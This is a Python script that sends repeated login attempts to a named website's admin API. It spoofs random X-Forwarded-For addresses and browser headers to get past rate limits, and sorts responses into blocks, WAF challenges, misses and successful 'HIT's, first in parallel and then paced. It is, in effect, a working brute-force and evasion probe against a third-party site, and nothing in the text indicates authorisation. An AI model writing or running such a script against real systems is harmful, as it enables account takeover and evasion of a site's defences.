import json,random,sys,time,urllib.request,urllib.error
from collections import Counter
TARGET="https://www.kufaka.com/adminApi/auth/login"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
MISS="用户名或密码不正确"
N=int(sys.argv[1]) if len(sys.argv)>1 else 200
PACE=float(sys.argv[2]) if len(sys.argv)>2 else 0.5
CONC=int(sys.argv[3]) if len(sys.argv)>3 else 2
def rand_ip(): return "%d.%d.%d.%d"%(random.randint(1,223),random.randint(0,255),random.randint(0,255),random.randint(1,254))
def classify(st,txt):
    if st in (403,429): return "block"
    if st==200 and MISS in txt: return "miss"
    if st==200 and "不能为空" in txt: return "invalid"
    if st==200 and ("_waf_is_mobile" in txt[:400] or "doctypehtml" in txt[:20].lower() or "slider" in txt[:400]): return "challenge"
    if st==200: return "HIT:"+txt[:80]
    return "other_%s"%st
def one(u,p):
    body=json.dumps({"username":u,"password":p}).encode()
    req=urllib.request.Request(TARGET,data=body,method="POST")
    for k,v in {"Content-Type":"application/json","X-Forwarded-For":rand_ip(),"User-Agent":UA,
        "Referer":"https://www.kufaka.com/package/admin/","Origin":"https://www.kufaka.com",
        "Accept":"application/json, text/plain, */*","Accept-Language":"zh-CN,zh;q=0.9"}.items():
        req.add_header(k,v)
    try:
        r=urllib.request.urlopen(req,timeout=25); return r.status,r.read().decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try: b=e.read().decode("utf-8","ignore")
        except Exception: b=""
        return e.code,b
    except Exception as e: return 0,"ERR:%s"%type(e).__name__
# tiny precheck conc
import concurrent.futures
c=Counter(); first20=[]
with concurrent.futures.ThreadPoolExecutor(max_workers=CONC) as ex:
    fs=[ex.submit(one,"admin","probe%d"%i) for i in range(20)]
    for f in concurrent.futures.as_completed(fs):
        st,txt=f.result(); k=classify(st,txt); c[k]+=1; first20.append(k)
print("PRECHECK conc=%d n=20 ->"%CONC, dict(c), flush=True)
print("PRECHECK seq:",first20,flush=True)
# paced sequential
c2=Counter(); t0=time.time()
seq=[]
for i in range(N):
    st,txt=one("admin","probe%d"%i)
    k=classify(st,txt); c2[k]+=1; seq.append(k)
    time.sleep(PACE)
print("PACED n=%d pace=%.2fs ->"% (N,PACE), dict(c2), "elapsed=%.0fs"%(time.time()-t0), flush=True)
print("PACED seq:",seq, flush=True)
